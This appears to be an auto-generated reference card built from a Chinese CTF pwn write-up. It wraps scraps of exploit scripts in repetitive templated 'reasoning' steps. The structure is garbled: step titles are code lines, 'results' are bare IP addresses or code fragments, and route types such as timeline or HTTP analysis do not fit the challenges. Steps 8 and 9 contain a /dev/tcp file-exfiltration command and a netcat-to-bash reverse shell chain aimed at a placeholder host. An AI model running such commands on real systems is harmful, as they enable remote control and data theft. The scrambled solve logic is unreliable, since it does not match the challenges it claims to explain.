# CTF pwn 方向部分题解_普通网友的博客-CSDN博客_ctfpwn方向比赛题目及解析

## Case Metadata

- Category: `Pwn`
- Platform: `CTF pwn 方向部分题解`
- Difficulty: `unknown`
- Source repository: `https://github.com/apachecn/apachecn-ctf-wiki`
- Source commit: `762ca130572c95196cf120e5f4ad5fbdd88b1b93`
- Source file: `docs/CTF-pwn-方向部分题解_普通网友的博客-CSDN博客_ctfpwn方向比赛题目及解析.md`
- Source URL: `https://github.com/apachecn/apachecn-ctf-wiki/blob/762ca130572c95196cf120e5f4ad5fbdd88b1b93/docs/CTF-pwn-%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_%E6%99%AE%E9%80%9A%E7%BD%91%E5%8F%8B%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2_ctfpwn%E6%96%B9%E5%90%91%E6%AF%94%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%8F%8A%E8%A7%A3%E6%9E%90.md`
- Local source mirror: `sources/apachecn-apachecn-ctf-wiki/repo/docs/CTF-pwn-方向部分题解_普通网友的博客-CSDN博客_ctfpwn方向比赛题目及解析.md`

## Why This Case Matters

Use this case as a Pwn reference for binary, ciphertext, stego-media challenges.

## Input Signals

- Artifacts: binary, ciphertext, stego-media
- Tools: checksec, gdb, netcat, one-gadget, pwntools, radare2
- Techniques: binary-exploitation, classical-crypto, command-injection, encoding-analysis, qr-analysis, ret2libc, ret2text, stack-overflow, web-exploitation

## First-Principles Route

- Start from binary properties, architecture, mitigations, and obvious control-flow or memory-corruption primitives.
- Prove the crash or control point first, then derive the shortest control-flow path such as ret2text, ret2libc, or stack pivot.
- Keep offsets, gadgets, and calling assumptions tied to concrete disassembly or debugger evidence.

## Solve Thinking

### Step 1: Document

- Route type: `checksec-driven evidence lookup`
- Why: For Pwn, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
- Tools: checksec, gdb, netcat, one-gadget, pwntools
- Reasoning chain:
  - Recognize the section as checksec-driven evidence lookup.
  - Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `-->`

### Step 2: CTF pwn 方向部分题解_普通网友的博客-CSDN博客_ctfpwn方向比赛题目及解析

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use checksec, gdb, netcat, one-gadget to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: checksec, gdb, netcat, one-gadget, pwntools
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use checksec, gdb, netcat, one-gadget to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `> 来源：[https://blog.csdn.net/kali_Ma/article/details/122457773](https://blog.csdn.net/kali_Ma/article/details/122457773)`

### Step 3: dataleak

- Route type: `incident timeline reconstruction`
- Why: Incident-response cases become reusable when every claim is anchored to timestamped artifact correlation.
- Probe: Use checksec, pwntools to anchor the event in time, user, host, and file/process context before answering.
- Tools: checksec, pwntools
- Reasoning chain:
  - Recognize the section as incident timeline reconstruction.
  - Use checksec, pwntools to anchor the event in time, user, host, and file/process context before answering.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `124.70.202.226`

### Step 4: gadget

- Route type: `stack control exploitation`
- Why: Binary exploitation cases should lock offsets, mitigations, and the shortest win path before gadget collecting spirals.
- Probe: Use pwntools to confirm the overwrite boundary, control target, and calling path before sending the final payload.
- Tools: pwntools
- Reasoning chain:
  - Recognize the section as stack control exploitation.
  - Use pwntools to confirm the overwrite boundary, control target, and calling path before sending the final payload.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `121.37.135.138`

### Step 5: Christmas_song

- Route type: `netcat-driven evidence lookup`
- Why: For Pwn, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat, pwntools to collect the smallest evidence slice that answers the goal.
- Tools: netcat, pwntools
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat, pwntools to collect the smallest evidence slice that answers the goal.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `124.71.144.133`

### Step 6: Christmas_bash

- Route type: `checksec-driven evidence lookup`
- Why: For Pwn, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
- Tools: checksec, gdb, netcat, one-gadget, pwntools
- Reasoning chain:
  - Recognize the section as checksec-driven evidence lookup.
  - Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `"""`

### Step 7: Christmas_Wishes

- Route type: `timeline reconstruction`
- Why: Timeline questions should be answered from normalized artifact timestamps with timezone assumptions recorded.
- Probe: Use netcat, pwntools to align timestamps and identify the event that satisfies the question.
- Tools: netcat, pwntools
- Reasoning chain:
  - Recognize the section as timeline reconstruction.
  - Use netcat, pwntools to align timestamps and identify the event that satisfies the question.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `libc.address = libc_addr`

### Step 8: print(hex(libc.sym['__free_hook']))

- Route type: `checksec-driven evidence lookup`
- Why: For Pwn, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
- Tools: checksec, gdb, netcat, one-gadget, pwntools
- Reasoning chain:
  - Recognize the section as checksec-driven evidence lookup.
  - Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `shell = 'bash -c \'/This_is_your_gift > /dev/tcp/ip/7777\''`

### Step 9: shell = 'nc ip 7777|/bin/bash|nc ip 9999'

- Route type: `checksec-driven evidence lookup`
- Why: For Pwn, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
- Tools: checksec, gdb, netcat, one-gadget, pwntools
- Reasoning chain:
  - Recognize the section as checksec-driven evidence lookup.
  - Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `payload = ''`

### Step 10: add('a'*0x18 + str(i), 'a'*0x20)

- Route type: `checksec-driven evidence lookup`
- Why: For Pwn, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
- Tools: checksec, gdb, netcat, one-gadget, pwntools
- Reasoning chain:
  - Recognize the section as checksec-driven evidence lookup.
  - Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `49.232.202.102`

### Step 11: Checkin_ret2text

- Route type: `command execution path`
- Why: Command execution routes should separate syntax proof, filter bypass, and final file-read or shell step.
- Probe: Use checksec, gdb, netcat, one-gadget with the extracted filter/query `gdb.attach(p, cmdstr)` and inspect the matching evidence.
- Tools: checksec, gdb, netcat, one-gadget, pwntools, radare2
- Filters or commands:
  - `gdb.attach(p, cmdstr)`
  - `success('%s ==> 0x%x'%(info, ret))`
  - `p.recvuntil('== ')`
  - `base64_e = p.recvuntil('==end==\n')[:-8]`
- Reasoning chain:
  - Recognize the section as command execution path.
  - Use checksec, gdb, netcat, one-gadget with the extracted filter/query `gdb.attach(p, cmdstr)` and inspect the matching evidence.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `123.60.82.85`

### Step 12: print(hex(rk))

- Route type: `checksec-driven evidence lookup`
- Why: For Pwn, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
- Tools: checksec, gdb, netcat, one-gadget, pwntools
- Reasoning chain:
  - Recognize the section as checksec-driven evidence lookup.
  - Use checksec, gdb, netcat, one-gadget to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `insert((rk, va))`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
